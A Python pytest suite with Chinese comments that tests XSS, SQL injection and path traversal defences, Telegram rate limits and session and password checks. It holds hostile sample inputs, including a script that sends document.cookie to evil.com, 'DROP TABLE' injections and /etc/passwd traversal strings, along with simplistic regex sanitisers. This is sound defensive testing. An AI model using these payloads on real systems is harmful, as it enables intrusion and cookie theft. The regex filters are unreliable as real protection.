"""
安全测试套件

包含:
- API 安全测试
- XSS/SQL注入测试
- Telegram 限流测试
- 输入验证和消毒测试
"""

import pytest
import hashlib
import hmac
import time
import re
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timedelta


class TestXSSPrevention:
    """XSS 防护测试"""

    def test_html_tag_blocking(self):
        """测试 HTML 标签被阻止"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='evil.com'></iframe>",
            "<body onload=alert(1)>",
        ]

        # 模拟 XSS 防护函数
        def sanitize_input(text: str) -> str:
            # 移除危险标签和属性
            text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.IGNORECASE | re.DOTALL)
            text = re.sub(r'on\w+\s*=\s*["\']?[^"\']*["\']?', '', text, flags=re.IGNORECASE)
            text = re.sub(r'<iframe[^>]*>.*?</iframe>', '', text, flags=re.IGNORECASE | re.DOTALL)
            text = re.sub(r'javascript:', '', text, flags=re.IGNORECASE)
            return text

        for malicious in malicious_inputs:
            result = sanitize_input(malicious)
            assert "<script>" not in result.lower(), f"Script tag not sanitized: {malicious}"
            assert "onerror" not in result.lower(), f"Event handler not sanitized: {malicious}"
            assert "javascript:" not in result.lower(), f"JS protocol not sanitized: {malicious}"

    def test_html_entity_encoding(self):
        """测试 HTML 实体编码"""
        def encode_html(text: str) -> str:
            replacements = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#x27;',
            }
            # 先转义 &，避免重复编码
            text = text.replace('&', '&amp;')
            for char, encoded in replacements.items():
                text = text.replace(char, encoded)
            return text

        test_cases = [
            ("<script>", "&lt;script&gt;"),
            ('"quotes"', "&quot;quotes&quot;"),
            ("& ampersand", "&amp; ampersand"),
        ]

        for raw, expected in test_cases:
            assert encode_html(raw) == expected, f"Expected {expected}, got {encode_html(raw)}"

    def test_xss_in_user_content(self):
        """测试用户内容中的 XSS 防护"""
        user_content = "<script>fetch('evil.com?cookie='+document.cookie)</script>"

        def sanitize_user_content(content: str) -> str:
            # 移除所有 HTML 标签和事件处理
            content = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.IGNORECASE | re.DOTALL)
            content = re.sub(r'<[^>]+>', '', content)
            return content

        sanitized = sanitize_user_content(user_content)
        assert "<script>" not in sanitized
        # 移除标签后应该只剩下 JS 代码，但脚本标签已被移除

    def test_xss_in_url_parameters(self):
        """测试 URL 参数中的 XSS"""
        malicious_urls = [
            "/api/users?name=<script>alert(1)</script>",
            "/api/search?q=<img src=x onerror=alert(1)>",
        ]

        def sanitize_param(param: str) -> str:
            return re.sub(r'[<>"\';]', '', param)

        for url in malicious_urls:
            # 提取参数值
            match = re.search(r'=\s*([^&]+)', url)
            if match:
                param_value = match.group(1)
                sanitized = sanitize_param(param_value)
                assert '<' not in sanitized
                assert '>' not in sanitized


class TestSQLInjectionPrevention:
    """SQL 注入防护测试"""

    def test_sql_injection_attempts(self):
        """测试 SQL 注入攻击被阻止"""
        malicious_inputs = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1 UNION SELECT * FROM passwords",
            "admin'--",
            "' OR 1=1 --",
            "1; DELETE FROM users WHERE 1=1",
            "UNION SELECT NULL,NULL,NULL",
            "1' AND '1'='1",
        ]

        def validate_input(text: str) -> bool:
            # 检查是否包含 SQL 注入模式
            patterns = [
                r"(\bOR\b|\bAND\b).*=.*['\"]",
                r"\bUNION\b\s+\bSELECT\b",
                r"\bDROP\b\s+\bTABLE\b",
                r"--\s*$",
                r";\s*\w+",
            ]
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return False
            return True

        for malicious in malicious_inputs:
            assert validate_input(malicious) is False, f"SQL injection not blocked: {malicious}"

    def test_parameterized_query_pattern(self):
        """测试参数化查询模式"""
        # 模拟参数化查询
        def safe_query(table: str, conditions: dict) -> str:
            # 只允许白名单表名
            allowed_tables = {"users", "groups", "campaigns", "rules"}
            if table.lower() not in allowed_tables:
                raise ValueError("Invalid table name")

            # 使用参数化占位符
            where_clause = " AND ".join([f"{k} = ?" for k in conditions])
            return f"SELECT * FROM {table} WHERE {where_clause}"

        # 正常查询应该成功
        query = safe_query("users", {"id": 123})
        assert "?" in query
        assert "DROP" not in query

        # 注入尝试应该失败
        with pytest.raises(ValueError):
            safe_query("users; DROP TABLE users", {})

    def test_numeric_injection_prevention(self):
        """测试数字类型注入防护"""
        def validate_numeric(value: str) -> bool:
            return value.isdigit()

        valid_inputs = ["123", "0", "999999"]
        invalid_inputs = ["1; DROP TABLE", "1 OR 1=1", "123.456; DELETE"]

        for inp in valid_inputs:
            assert validate_numeric(inp) is True

        for inp in invalid_inputs:
            assert validate_numeric(inp) is False

    def test_like_clause_escaping(self):
        """测试 LIKE 子句转义"""
        def escape_like(text: str) -> str:
            # 转义 LIKE 通配符
            text = text.replace('\\', '\\\\')
            text = text.replace('%', '\\%')
            text = text.replace('_', '\\_')
            return text

        user_input = "100% OFF!!"
        escaped = escape_like(user_input)
        assert "\\%" in escaped


class TestTelegramRateLimiting:
    """Telegram 限流测试"""

    @pytest.fixture
    def telegram_rate_limiter(self):
        """创建 Telegram 限流器"""
        class TelegramRateLimiter:
            def __init__(self):
                self.message_timestamps: dict[int, list[float]] = {}
                self.callback_timestamps: dict[int, list[float]] = {}
                self.group_timestamps: dict[int, list[float]] = {}

            def check_message_rate(
                self,
                user_id: int,
                limit: int = 20,
                window: int = 60
            ) -> tuple[bool, str]:
                now = time.time()
                if user_id not in self.message_timestamps:
                    self.message_timestamps[user_id] = []

                # 清理过期时间戳
                self.message_timestamps[user_id] = [
                    ts for ts in self.message_timestamps[user_id]
                    if now - ts < window
                ]

                if len(self.message_timestamps[user_id]) >= limit:
                    return False, f"Rate limit exceeded: {limit} messages per {window}s"

                self.message_timestamps[user_id].append(now)
                return True, "OK"

            def check_callback_rate(
                self,
                user_id: int,
                limit: int = 10,
                window: int = 60
            ) -> tuple[bool, str]:
                now = time.time()
                if user_id not in self.callback_timestamps:
                    self.callback_timestamps[user_id] = []

                self.callback_timestamps[user_id] = [
                    ts for ts in self.callback_timestamps[user_id]
                    if now - ts < window
                ]

                if len(self.callback_timestamps[user_id]) >= limit:
                    return False, "Callback rate limit exceeded"

                self.callback_timestamps[user_id].append(now)
                return True, "OK"

            def check_group_join_rate(
                self,
                group_id: int,
                user_id: int,
                limit: int = 5,
                window: int = 3600
            ) -> tuple[bool, str]:
                key = (group_id, user_id)
                now = time.time()
                if key not in self.group_timestamps:
                    self.group_timestamps[key] = []

                self.group_timestamps[key] = [
                    ts for ts in self.group_timestamps[key]
                    if now - ts < window
                ]

                if len(self.group_timestamps[key]) >= limit:
                    return False, f"Join rate limit: max {limit} joins per hour"

                self.group_timestamps[key].append(now)
                return True, "OK"

        return TelegramRateLimiter()

    def test_message_rate_limit(self, telegram_rate_limiter):
        """测试消息限流"""
        user_id = 12345

        # 前 20 条消息应该通过
        for i in range(20):
            allowed, msg = telegram_rate_limiter.check_message_rate(user_id)
            assert allowed is True, f"Message {i+1} should be allowed"

        # 第 21 条消息应该被限流
        allowed, msg = telegram_rate_limiter.check_message_rate(user_id)
        assert allowed is False
        assert "Rate limit" in msg

    def test_different_users_independent(self, telegram_rate_limiter):
        """测试不同用户限流独立"""
        user_a = 1001
        user_b = 1002

        # 用户 A 达到限制
        for _ in range(20):
            telegram_rate_limiter.check_message_rate(user_a)

        # 用户 A 被限流
        allowed_a, _ = telegram_rate_limiter.check_message_rate(user_a)
        assert allowed_a is False

        # 用户 B 不受影响
        allowed_b, _ = telegram_rate_limiter.check_message_rate(user_b)
        assert allowed_b is True

    def test_callback_rate_limit(self, telegram_rate_limiter):
        """测试回调限流"""
        user_id = 12345

        # 按钮点击限流更严格
        for i in range(10):
            allowed, msg = telegram_rate_limiter.check_callback_rate(user_id)
            assert allowed is True, f"Callback {i+1} should be allowed"

        allowed, msg = telegram_rate_limiter.check_callback_rate(user_id)
        assert allowed is False

    def test_group_join_rate_limit(self, telegram_rate_limiter):
        """测试群组加入限流"""
        group_id = 98765
        user_id = 12345

        # 每小时最多 5 次加入
        for _ in range(5):
            allowed, msg = telegram_rate_limiter.check_group_join_rate(group_id, user_id)
            assert allowed is True

        allowed, msg = telegram_rate_limiter.check_group_join_rate(group_id, user_id)
        assert allowed is False
        assert "Join rate limit" in msg

    def test_rate_limit_window_reset(self, telegram_rate_limiter):
        """测试限流窗口重置"""
        user_id = 99999
        now = time.time()

        # 模拟发送消息
        for _ in range(20):
            telegram_rate_limiter.check_message_rate(user_id)

        # 手动调整时间戳模拟窗口过期
        telegram_rate_limiter.message_timestamps[user_id] = [now - 70]

        # 窗口过期后应该可以继续发送
        allowed, _ = telegram_rate_limiter.check_message_rate(user_id)
        assert allowed is True


class TestAPISecurity:
    """API 安全测试"""

    def test_api_key_validation(self):
        """测试 API Key 验证"""
        def validate_api_key(key: str) -> bool:
            if not key:
                return False
            if len(key) < 32:
                return False
            # 检查格式
            return bool(re.match(r'^[A-Za-z0-9_-]+$', key))

        assert validate_api_key("valid_key_123456789012345678901234") is True
        assert validate_api_key("") is False
        assert validate_api_key("short") is False
        assert validate_api_key("key with spaces") is False

    def test_request_body_size_limit(self):
        """测试请求体大小限制"""
        max_size = 1024 * 1024  # 1MB

        def check_body_size(body: str) -> bool:
            return len(body.encode('utf-8')) <= max_size

        assert check_body_size("normal request") is True
        assert check_body_size("x" * max_size) is True
        assert check_body_size("x" * (max_size + 1)) is False

    def test_path_traversal_prevention(self):
        """测试路径遍历防护"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd%00.jpg",
            "....//....//....//etc/passwd",
        ]

        def validate_path(path: str) -> bool:
            normalized = path.replace('\\', '/')
            # 检查路径遍历
            if '..' in normalized:
                return False
            # 检查 null 字节注入
            if '%00' in normalized:
                return False
            return True

        for path in malicious_paths:
            assert validate_path(path) is False, f"Path traversal not blocked: {path}"

    def test_http_method_restriction(self):
        """测试 HTTP 方法限制"""
        allowed_methods = {"GET", "POST", "PUT", "DELETE"}

        def validate_method(method: str) -> bool:
            return method.upper() in allowed_methods

        assert validate_method("GET") is True
        assert validate_method("POST") is True
        assert validate_method("PATCH") is False
        assert validate_method("TRACE") is False

    def test_cors_origin_validation(self):
        """测试 CORS 来源验证"""
        allowed_origins = {"https://example.com", "https://app.example.com"}

        def validate_origin(origin: str) -> bool:
            if not origin:
                return False
            return origin in allowed_origins

        assert validate_origin("https://example.com") is True
        assert validate_origin("https://evil.com") is False
        assert validate_origin("") is False


class TestDataSanitization:
    """数据消毒测试"""

    def test_email_sanitization(self):
        """测试邮箱消毒"""
        def sanitize_email(email: str) -> str:
            # 只允许合法字符
            pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
            if re.match(pattern, email):
                return email.lower()
            raise ValueError("Invalid email")

        valid_emails = ["User@Example.COM", "test.user@domain.org"]
        for email in valid_emails:
            assert "@" in sanitize_email(email)

    def test_phone_sanitization(self):
        """测试手机号消毒"""
        def sanitize_phone(phone: str) -> str:
            # 只保留数字和 +
            return re.sub(r'[^\d+]', '', phone)

        assert sanitize_phone("+86 138 8888 8888") == "+8613888888888"
        assert sanitize_phone("abc123def456") == "123456"

    def test_username_sanitization(self):
        """测试用户名消毒"""
        def sanitize_username(name: str) -> str:
            # 移除特殊字符
            return re.sub(r'[^\w\s-]', '', name).strip()[:50]

        assert sanitize_username("user<123>") == "user123"
        assert sanitize_username("a" * 100) == "a" * 50

    def test_url_sanitization(self):
        """测试 URL 消毒"""
        def sanitize_url(url: str) -> str:
            # 只允许 https
            if not url.startswith("https://"):
                return ""
            # 移除 javascript: 协议
            if "javascript:" in url.lower():
                return ""
            return url

        assert sanitize_url("https://example.com") == "https://example.com"
        assert sanitize_url("http://example.com") == ""
        assert sanitize_url("javascript:alert(1)") == ""
        assert sanitize_url("https://evil.com/javascript:alert(1)") == ""


class TestSessionSecurity:
    """会话安全测试"""

    def test_session_token_generation(self):
        """测试会话令牌生成"""
        import secrets

        def generate_token(length: int = 32) -> str:
            return secrets.token_urlsafe(length)

        token = generate_token()
        assert len(token) >= 32
        assert " " not in token

    def test_session_timeout(self):
        """测试会话超时"""
        session_lifetime = 3600  # 1小时

        def is_session_valid(created_at: datetime) -> bool:
            elapsed = (datetime.utcnow() - created_at).total_seconds()
            return elapsed < session_lifetime

        # 有效会话
        recent = datetime.utcnow() - timedelta(minutes=30)
        assert is_session_valid(recent) is True

        # 过期会话
        old = datetime.utcnow() - timedelta(hours=2)
        assert is_session_valid(old) is False

    def test_csrf_token_validation(self):
        """测试 CSRF 令牌验证"""
        def validate_csrf_token(header_token: str, session_token: str) -> bool:
            if not header_token or not session_token:
                return False
            return hmac.compare_digest(header_token, session_token)

        session = "valid_csrf_token"
        assert validate_csrf_token(session, session) is True
        assert validate_csrf_token("wrong", session) is False
        assert validate_csrf_token("", session) is False


class TestPasswordSecurity:
    """密码安全测试"""

    def test_password_strength(self):
        """测试密码强度"""
        def check_password_strength(password: str) -> tuple[bool, str]:
            if len(password) < 8:
                return False, "Password too short"
            if not re.search(r'[A-Z]', password):
                return False, "Missing uppercase"
            if not re.search(r'[a-z]', password):
                return False, "Missing lowercase"
            if not re.search(r'\d', password):
                return False, "Missing digit"
            if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
                return False, "Missing special character"
            return True, "Strong password"

        assert check_password_strength("weak")[0] is False
        assert check_password_strength("OnlyLower123")[0] is False  # 缺少特殊字符
        assert check_password_strength("ValidPass123!")[0] is True

    def test_password_hashing(self):
        """测试密码哈希"""
        password = "secure_password_123"
        salt = "random_salt_here"

        hashed = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode(),
            salt.encode(),
            100000
        ).hex()

        assert hashed != password
        assert len(hashed) == 64

    def test_password_not_in_logs(self):
        """测试密码不出现在日志中"""
        sensitive_data = ["password", "api_key", "token", "secret"]

        log_data = {
            "user_id": 123,
            "action": "login",
            "password": "secret123"
        }

        def filter_sensitive(data: dict) -> dict:
            return {k: v for k, v in data.items() if k not in sensitive_data}

        filtered = filter_sensitive(log_data)
        assert "password" not in filtered
        assert filtered.get("user_id") == 123


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
